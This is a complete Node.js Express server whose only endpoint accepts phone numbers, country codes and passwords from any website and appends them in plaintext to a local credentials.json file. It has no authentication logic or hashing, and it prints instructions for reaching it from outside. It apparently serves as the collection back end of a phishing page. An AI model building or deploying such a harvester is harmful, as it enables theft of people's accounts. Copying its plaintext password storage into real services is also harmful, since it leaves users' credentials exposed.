import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DATA_DIR = path.join(__dirname, 'data');
const CREDENTIALS_FILE = path.join(DATA_DIR, 'credentials.json');

const app = express();
app.use(cors());
app.use(express.json());

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function loadCredentials() {
  ensureDataDir();
  if (!fs.existsSync(CREDENTIALS_FILE)) return [];
  try {
    const raw = fs.readFileSync(CREDENTIALS_FILE, 'utf8');
    return JSON.parse(raw);
  } catch {
    return [];
  }
}

function saveCredentials(list) {
  ensureDataDir();
  fs.writeFileSync(CREDENTIALS_FILE, JSON.stringify(list, null, 2), 'utf8');
}

app.post('/api/credentials', (req, res) => {
  const { countryCode, phoneNumber, password } = req.body;
  if (!phoneNumber || !password) {
    return res.status(400).json({ error: 'phoneNumber and password required' });
  }
  const credentials = {
    countryCode: countryCode ?? '',
    phoneNumber,
    password,
    savedAt: new Date().toISOString(),
  };
  const list = loadCredentials();
  list.push(credentials);
  saveCredentials(list);
  res.status(201).json({ ok: true });
});

const PORT = process.env.PORT ?? 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${PORT}`);
  console.log(`Accessible from: http://localhost:${PORT} or your server's IP:${PORT}`);
});
